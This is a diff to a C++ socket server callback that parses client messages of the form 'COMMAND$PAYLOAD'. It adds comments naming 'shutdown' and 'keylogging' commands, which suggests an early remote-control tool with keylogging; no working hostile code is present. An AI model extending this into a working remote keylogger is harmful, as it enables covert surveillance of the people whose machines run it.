@@ -4,6 +4,8 @@
 #include <opencv2/core.hpp>
 #include <opencv2/highgui.hpp>
 #include <opencv2/imgcodecs.hpp>
+#include <string> 
+#include <cstring>
 // #define S_OK 0
 
 // Support both Linux and Windows machine
@@ -23,22 +25,17 @@ using namespace Gdiplus;
 void serverCallback(char buffer[1024], int clientSocket)
 {
     cout << "Client: " << buffer << endl; 
-    string msg = to_string(buffer);
+    string msg(buffer);
     // "COMMAND$PAYLOAD"  
+    //shutdown$ 
+    //keylogging$a
     vector<string> msgArr = split(msg,"$");
     string command = msgArr[0];
-    string payload = msgArr[1];
+    string payload = msgArr[1]; 
+
 
 
     // match commands 
-    switch(command){
-        case "":  
-
-        break; 
-        default:    
-        cout << "Unknown command from client: " << msg << endl;
-        break;
-    }
     
     send(clientSocket, "ok", strlen("ok"), 0);
 }
